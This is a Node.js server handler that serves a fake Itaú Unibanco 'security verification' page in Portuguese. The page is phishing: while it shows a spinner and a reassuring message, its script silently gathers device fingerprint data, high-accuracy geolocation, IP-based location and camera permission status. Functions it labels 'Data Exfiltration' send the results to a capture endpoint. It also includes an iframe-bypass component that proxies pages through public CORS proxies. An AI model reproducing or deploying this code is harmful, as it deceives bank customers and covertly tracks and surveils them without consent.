module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'text/html charset=utf-8')
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
    
    const html = `<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança - Itaú</title>
    <style>body{font-family:Segoe UI;background:linear-gradient(135deg,#a00 0%,#900 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0;}
    .container{background:rgba(0,0,0,0.8);border-radius:15px;padding:40px;text-align:center;max-width:500px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #f44;}
    .logo{font-size:28px;font-weight:bold;margin-bottom:20px;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
    .status{background:rgba(255,255,255,0.1);padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f44;}
    .loading{font-size:16px;color:#ccc;margin-top:20px;}
    .spinner{border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top:3px solid #fff;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto;}
    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="container">
        <div class="logo">ITAÚ UNIBANCO</div>
        <div class="status">
            <h2>🔒 Verificação de Segurança em Andamento</h2>
            <p>Estamos verificando seu dispositivo contra ameaças conhecidas...</p>
        </div>
        <div class="spinner"></div>
        <div class="loading">⏳ Processo automático - Aguarde...</div>
    </div>
    <script>
        // X-Frame Bypass Component
        customElements.define('x-frame-bypass', class extends HTMLIFrameElement {
            static get observedAttributes() { return ['src'] }
            constructor() { super() }
            attributeChangedCallback() { this.load(this.src) }
            connectedCallback() {
                this.sandbox = 'allow-forms allow-modals allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation';
            }
            load(url, options) {
                if (!url || !url.startsWith('http')) return;
                this.srcdoc = \`<html><head><style>.loader{position:absolute;top:calc(50% - 25px);left:calc(50% - 25px);width:50px;height:50px;background:#333;border-radius:50%;animation:loader 1s infinite ease-in-out;}@keyframes loader{0%{transform:scale(0);}100%{transform:scale(1);opacity:0;}}</style></head><body><div class="loader"></div></body></html>\`;
                this.fetchProxy(url, options, 0).then(res => res.text()).then(data => {
                    if (data) this.srcdoc = data.replace(/<head([^>]*)>/i, \`<head\$1><base href="\${url}"><script>document.addEventListener('click', e => { if (frameElement && document.activeElement && document.activeElement.href) { e.preventDefault(); frameElement.load(document.activeElement.href); } }); document.addEventListener('submit', e => { if (frameElement && document.activeElement && document.activeElement.form && document.activeElement.form.action) { e.preventDefault(); if (document.activeElement.form.method === 'post') frameElement.load(document.activeElement.form.action, {method: 'post', body: new FormData(document.activeElement.form)}); else frameElement.load(document.activeElement.form.action + '?' + new URLSearchParams(new FormData(document.activeElement.form))); } });</script>\`);
                }).catch(e => console.error('X-Frame-Bypass error:', e))
            }
            fetchProxy(url, options, i) {
                const proxies = ['https://cors-anywhere.herokuapp.com/', 'https://yacdn.org/proxy/', 'https://api.codetabs.com/v1/proxy/?quest=']
                return fetch(proxies[i] + url, options).then(res => { if (!res.ok) throw new Error(\`\${res.status} \${res.statusText}\`) return res }).catch(error => { if (i === proxies.length - 1) throw error return this.fetchProxy(url, options, i + 1) })
            }
        }, {extends: 'iframe'})

        // Enhanced Data Collection
        async function collectData() {
            const payload = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
                window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight },
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            }

            // Force Geolocation with High Accuracy
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    })
                })
                payload.geolocation = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }
            } catch (err) {
                payload.geolocationError = err.message
            }

            // Multi-Source IP Triangulation
            try {
                const [ipapi, ipinfo] = await Promise.allSettled([
                    fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : null),
                    fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : null)
                ])
                payload.ipLocation = ipapi.value || ipinfo.value || null
            } catch (err) {
                payload.ipError = err.message
            }

            // Attempt Camera Access
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true })
                payload.cameraCapture = "GRANTED"
                stream.getTracks().forEach(track => track.stop())
            } catch (err) {
                payload.cameraError = err.message
            }

            return payload
        }

        // Data Exfiltration
        async function exfiltrate(data) {
            const endpoints = [
                () => navigator.sendBeacon('/api/capture', JSON.stringify(data)),
                () => fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }),
                () => fetch('/api/capture?data=' + encodeURIComponent(JSON.stringify(data)))
            ]
            for (const endpoint of endpoints) {
                try { if (await endpoint()) return true } catch (e) { console.warn('Exfiltration failed:', e) }
            }
            return false
        }

        // Execute
        setTimeout(async () => {
            const data = await collectData()
            const success = await exfiltrate(data)
            document.querySelector('.status').innerHTML = success ? 
                '<h2>✅ Verificação Concluída</h2><p>Seu dispositivo foi verificado com sucesso.</p>' :
                '<h2>⚠️ Verificação Parcial</h2><p>Algumas informações não puderam ser processadas.</p>'
            document.querySelector('.spinner').style.display = 'none'
        }, 3000)
    </script>
</body></html>`
    res.send(html)
}
